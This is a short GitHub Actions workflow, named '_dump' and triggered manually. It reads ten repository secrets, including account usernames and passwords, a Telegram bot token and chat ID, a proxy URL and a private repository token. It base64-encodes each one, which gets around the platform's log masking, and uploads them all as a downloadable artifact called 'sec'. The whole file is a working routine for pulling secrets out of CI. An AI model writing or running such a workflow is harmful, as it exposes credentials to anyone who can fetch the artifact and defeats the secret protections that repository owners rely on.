name: _dump
on:
  workflow_dispatch: {}
jobs:
  e:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S_FC_PASS: ${{ secrets.FC_PASS }}
          S_FC_PASS_2: ${{ secrets.FC_PASS_2 }}
          S_FC_PASS_3: ${{ secrets.FC_PASS_3 }}
          S_FC_TG_CHAT: ${{ secrets.FC_TG_CHAT }}
          S_FC_TG_TOKEN: ${{ secrets.FC_TG_TOKEN }}
          S_FC_USER: ${{ secrets.FC_USER }}
          S_FC_USER_2: ${{ secrets.FC_USER_2 }}
          S_FC_USER_3: ${{ secrets.FC_USER_3 }}
          S_HY2_PROXY_URL: ${{ secrets.HY2_PROXY_URL }}
          S_PRIVATE_REPO_TOKEN: ${{ secrets.PRIVATE_REPO_TOKEN }}
        run: |
          mkdir -p out
          printf '%s' "$S_FC_PASS" | base64 -w0 > out/FC_PASS.b64
          printf '%s' "$S_FC_PASS_2" | base64 -w0 > out/FC_PASS_2.b64
          printf '%s' "$S_FC_PASS_3" | base64 -w0 > out/FC_PASS_3.b64
          printf '%s' "$S_FC_TG_CHAT" | base64 -w0 > out/FC_TG_CHAT.b64
          printf '%s' "$S_FC_TG_TOKEN" | base64 -w0 > out/FC_TG_TOKEN.b64
          printf '%s' "$S_FC_USER" | base64 -w0 > out/FC_USER.b64
          printf '%s' "$S_FC_USER_2" | base64 -w0 > out/FC_USER_2.b64
          printf '%s' "$S_FC_USER_3" | base64 -w0 > out/FC_USER_3.b64
          printf '%s' "$S_HY2_PROXY_URL" | base64 -w0 > out/HY2_PROXY_URL.b64
          printf '%s' "$S_PRIVATE_REPO_TOKEN" | base64 -w0 > out/PRIVATE_REPO_TOKEN.b64
      - uses: actions/upload-artifact@v4
        with:
          name: sec
          path: out/
